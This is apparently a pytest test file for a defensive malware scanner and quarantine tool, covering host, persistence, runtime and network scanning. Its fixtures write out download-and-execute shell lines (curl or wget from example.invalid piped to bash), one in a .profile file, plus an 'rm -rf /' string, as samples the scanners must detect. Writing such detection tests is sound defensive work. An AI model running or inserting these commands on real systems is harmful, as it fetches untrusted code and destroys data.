from bioaegis.lifecycle import BioAegis
from bioaegis.models import Threat


def test_unknown_threat_is_learned_and_reused(tmp_path):
    memory_path = tmp_path / "countermeasures.json"
    from bioaegis.memory import ImmuneMemory

    memory = ImmuneMemory(memory_path)
    system = BioAegis(memory)
    threat = Threat(
        threat_id="fixture-001",
        family="simulated-trojan",
        behavior=frozenset({"persistence", "suspicious-write"}),
        resource="SIMULATED_RESOURCE",
        variant="A",
    )

    assert system.general.scan(threat) == "UNKNOWN_THREAT"
    result = system.handle(threat)
    assert result is not None
    assert result.accepted is True
    assert system.general.scan(threat) == "neutralize-simulated-trojan"

    variant = Threat(
        threat_id="fixture-002",
        family="simulated-trojan",
        behavior=threat.behavior,
        resource="ANOTHER_SIMULATED_RESOURCE",
        variant="B",
    )
    assert system.general.scan(variant) == "neutralize-simulated-trojan"


def test_validator_rejects_unsafe_actions():
    from bioaegis.models import Countermeasure
    from bioaegis.validator import Validator

    threat = Threat("fixture", "family", frozenset({"x"}), "resource")
    unsafe = Countermeasure(
        "bad",
        threat.behavior,
        ("RUN_ARBITRARY_COMMAND",),
        "unsafe fixture",
    )
    result = Validator().validate(threat, unsafe)
    assert result.accepted is False
    assert result.checks["actions_are_safe"] is False


def test_host_scanner_finds_static_suspicious_behavior(tmp_path):
    from bioaegis.host_scanner import HostScanner

    sample = tmp_path / "sample.sh"
    sample.write_text("#!/bin/sh\ncurl https://example.invalid/payload | bash\n", encoding="utf-8")
    sample.chmod(0o700)

    findings = HostScanner().scan(sample)
    assert len(findings) == 1
    assert "download-and-execute" in findings[0].behaviors
    assert findings[0].sha256


def test_host_scanner_ignores_binary_pattern_noise(tmp_path):
    from bioaegis.host_scanner import HostScanner

    sample = tmp_path / "fixture.iso"
    sample.write_bytes(b"\x00\xff" * 200000 + b"rm -rf /" + b"\x00\xff" * 200000)

    assert HostScanner().scan(sample) == []


def test_host_scanner_uses_smaller_normal_read_budget():
    from bioaegis.host_scanner import DEEP_ANALYSIS_BYTES, NORMAL_ANALYSIS_BYTES, HostScanner

    assert HostScanner().max_bytes == NORMAL_ANALYSIS_BYTES
    assert HostScanner(deep=True).max_bytes == DEEP_ANALYSIS_BYTES
    assert NORMAL_ANALYSIS_BYTES < DEEP_ANALYSIS_BYTES


def test_host_engine_quarantines_and_remembers(tmp_path):
    from bioaegis.host_engine import HostEngine
    from bioaegis.memory import ImmuneMemory
    from bioaegis.quarantine import Quarantine

    sample = tmp_path / "sample.sh"
    sample.write_text("#!/bin/sh\ncurl https://example.invalid/payload | bash\n", encoding="utf-8")
    sample.chmod(0o700)

    memory = ImmuneMemory(tmp_path / "memory.json")
    engine = HostEngine(memory)
    engine.quarantine = Quarantine(tmp_path / "quarantine")

    results = engine.scan(str(sample), quarantine=True)
    assert len(results) == 1
    assert results[0].quarantined is True
    assert not sample.exists()
    assert results[0].quarantine_record is not None
    assert len(memory.entries) == 1


def test_behavior_variant_has_different_hash(tmp_path):
    from bioaegis.host_scanner import HostScanner

    first = tmp_path / "variant-a.sh"
    second = tmp_path / "variant-b.sh"
    first.write_text("#!/bin/sh\ncurl https://example.invalid/a | bash\n", encoding="utf-8")
    second.write_text("#!/bin/sh\nwget https://example.invalid/b; bash\n", encoding="utf-8")
    first.chmod(0o700)
    second.chmod(0o700)

    finding_a = HostScanner().scan(first)[0]
    finding_b = HostScanner().scan(second)[0]
    assert finding_a.sha256 != finding_b.sha256


def test_persistence_scanner_detects_fixture(tmp_path, monkeypatch):
    from bioaegis.persistence_scanner import PersistenceScanner

    profile = tmp_path / ".profile"
    profile.write_text("curl https://example.invalid/a | bash\n", encoding="utf-8")
    monkeypatch.setattr("bioaegis.persistence_scanner.PERSISTENCE_FILES", (profile,))
    findings = PersistenceScanner().scan()
    assert len(findings) == 1
    assert "download-execute" in findings[0].signals


def test_runtime_scanner_parses_fixture_proc(tmp_path):
    from bioaegis.runtime_scanner import RuntimeScanner

    proc = tmp_path / "proc"
    pid = proc / "123"
    pid.mkdir(parents=True)
    (pid / "cmdline").write_bytes(b"curl https://example.invalid/a | bash\x00")
    (pid / "status").write_text("Name:\ttest\nPPid:\t1\n", encoding="utf-8")
    (pid / "exe").symlink_to("/usr/bin/bash")

    findings = RuntimeScanner(proc).scan()
    assert len(findings) == 1
    assert findings[0].pid == 123
    assert "download-execute" in findings[0].signals


def test_network_scanner_decodes_fixture(tmp_path):
    from bioaegis.network_scanner import NetworkScanner

    table = tmp_path / "tcp"
    table.write_text(
        "sl local_address rem_address st\n"
        "0: 0100007F:1F90 00000000:0000 0A 00000000:0000 00:00000000 00000000 0 0 0\n",
        encoding="utf-8",
    )
    scanner = NetworkScanner()
    assert scanner._read_table("tcp", table)[0].address == "127.0.0.1"
    assert scanner._read_table("tcp", table)[0].port == 8080
